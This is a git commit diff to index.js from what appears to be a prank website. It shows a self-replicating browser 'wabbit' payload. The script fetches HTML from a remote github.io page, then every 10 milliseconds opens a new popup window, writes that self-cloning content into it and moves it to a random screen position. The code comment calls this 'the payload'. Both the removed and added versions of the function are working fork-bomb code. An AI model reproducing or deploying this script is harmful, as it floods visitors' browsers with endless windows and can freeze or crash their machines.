86697477842d63929315008b982ef7cbd62c9c2b
Jack <jack@insertdomain.name>
2020-02-15 21:27:55 -0500

    Update index.js

--- index.js
+++ index.js
@@ -6,11 +6,11 @@ let wabbitContent = '';
 	wabbitContent = await (await fetch('https://k4rakara.github.io/chrome-experience-requiem/wabbit.html')).text();
 })();
 
-async function createWabbit() { //Create a very similar clone window, with code to clone itself.
-	let wabbitSym = Symbol('wabbit');
-	window[wabbitSym] = window.open('','Wha-','width = 200,height = 200');
-	window[wabbitSym].document.write(wabbitContent);
-  	window[wabbitSym].moveTo((Math.random()*screen.width),(Math.random()*screen.height));
+function createWabbit() { //Create a very similar clone window, with code to clone itself.
+	const wabbitSym = Symbol('wabbit');
+	this[wabbitSym] = window.open('','Wha-','width = 200,height = 200');
+	this[wabbitSym].document.write(wabbitContent);
+  	this[wabbitSym].moveTo((Math.random()*screen.width),(Math.random()*screen.height));
 }
 
 setTimeout(function() {document.getElementById('theme').play(); setTimeout(function() {setInterval(createWabbit,10)}, 3000);}, 2750); //Wait for the voice clip to finish, then play the theme, and once the theme has gone on for 3 seconds, initialize the payload.
